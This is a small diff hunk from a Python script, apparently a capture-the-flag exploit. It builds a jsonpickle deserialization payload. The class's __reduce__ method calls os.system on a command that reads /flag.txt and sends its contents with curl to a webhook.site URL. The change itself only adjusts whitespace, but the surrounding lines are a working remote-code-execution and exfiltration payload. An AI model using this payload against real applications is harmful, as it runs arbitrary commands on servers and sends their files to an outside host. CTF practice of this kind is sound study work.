@@ -7,6 +7,6 @@ COMMAND = "curl -d $(cat /flag.txt) https://webhook.site/cf4e76ba-ad0b-4c72-a914
 class Shell(object):
     def __reduce__(self):
         import os
-        return (os.system,(COMMAND,))
+        return (os.system, (COMMAND,))
 
 print(e(jsonpickle.encode((Shell()))))
